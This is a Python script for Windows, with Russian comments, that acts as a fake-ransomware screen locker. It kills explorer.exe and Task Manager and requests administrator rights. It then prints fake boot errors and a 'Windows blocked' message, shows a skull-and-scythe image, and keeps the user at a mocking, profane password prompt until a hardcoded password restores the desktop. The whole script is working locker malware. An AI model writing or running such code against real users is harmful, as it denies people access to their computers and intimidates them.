import os
import time
import sys
import pyautogui
import ctypes
import subprocess
import winreg
pyautogui.press('f11')

from colorama import init, Fore, Back, Style
LF_FACESIZE = 32
STD_OUTPUT_HANDLE = -11

class COORD(ctypes.Structure):
    _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]

class CONSOLE_FONT_INFOEX(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_ulong),
                ("nFont", ctypes.c_ulong),
                ("dwFontSize", COORD),
                ("FontFamily", ctypes.c_uint),
                ("FontWeight", ctypes.c_uint),
                ("FaceName", ctypes.c_wchar * LF_FACESIZE)]

# Настройки шрифта
font = CONSOLE_FONT_INFOEX()
font.cbSize = ctypes.sizeof(CONSOLE_FONT_INFOEX)
font.nFont = 12  # Индекс шрифта
font.dwFontSize.X = 11  # Ширина символа
font.dwFontSize.Y = 18  # Высота символа (делает шрифт крупнее)
font.FontFamily = 54
font.FontWeight = 400
font.FaceName = "Lucida Console"  # Название шрифта

handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
ctypes.windll.kernel32.SetCurrentConsoleFontEx(
    handle, ctypes.c_long(False), ctypes.pointer(font))
init(autoreset=True)  # автоматический сброс стилей после каждого вывода

# Список процессов для завершения
processes = ["explorer.exe", "taskmgr.exe"]

for proc in processes:
    # Запускаем команду taskkill для каждого процесса
    subprocess.run(["taskkill", "/f", "/im", proc])

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Перезапуск от имени администратора
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

print("Booting Windows...", end='', flush=True)
time.sleep(1)

errors = [
    
    "Boot error: 0x0266712",
    "Boot error: 0x02897593",
    "Boot error: 0x01447812",
    "Boot error: 0x0150974",
    "Boot error: 0x03873700",
    "Boot error: 0x0700882",
    "Boot error: 0x03803618"
]

for error in errors:
    time.sleep(0.5)
    print(error)
    
time.sleep(1)
print("Memory section at address 0x0424* is locked!")
time.sleep(1)
print("Service UXCryptor started.")
time.sleep(1)
print("* Windows blocked!")


os.system('cls')
os.system('color 4f')  # 4 — красный фон, f — белый текст
def display_art():
    print("                       ...")
    print("                     ;::::;")
    print("                   ;::::; :;")
    print("                 ;::::::'  :;")
    print("                ;:::::'     ;.")
    print("              ,;::::::;      ;             ooo\\\\")
    print("              ::::::::;      ;            ooooo\\\\")
    print("             ,;::::::::;     ;           oooooooo")
    print("           ;::::::::::: . ,,;             / oooooo")
    print("          ;::::::::::::::::::;.          /  / Dooooo")
    print("         ;:::::::::::::::::::::;,       /  /     Dooo")
    print("      ' ,:::::::::::::::::::::::  ,    /  /        Dooo")
    print("        ;  ::::::   ::::::;;;:::   ,# /  /          Dooo")
    print("        :  :::::    :::::::::::: ,   /  /            Dooo")
    print("        ;: ::::    ::::::::::::: ,  /  /               Doo")
    print("         ;: ;::    ::::::::::::: , /  /                 Do")
    print("          :; :::     ::::::::::: ,/  /                   D")
    print("          ;: ::::     ::::::::::;,  / ")
    print("           ;::::::     ;::::::;;;,,/")
    print("           ;:::::::     :::::;;;;;,,")
    print("            :;;:::;:     :'  /   /,.")

if __name__ == "__main__":
    display_art()
time.sleep(2)  # Пауза на 2 секунд
os.system('cls')
os.system('color 1f')  # 1 — синий фон, f — белый текст


























# Бесконечно запрашиваем пароль, пока не введён верный.
# После правильного пароля — выход из программы.

PASSWORD = "lc"  # в реальных приложениях хранить только хэш!

while True:
    user_input = input("ну давай побробуй: ")
    if user_input == PASSWORD:
        subprocess.Popen(["explorer.exe"])
        print("да йоу ну зачем лан.")
        break  # завершение программы
    else:
        print("ебать лох, давай ещё раз)")
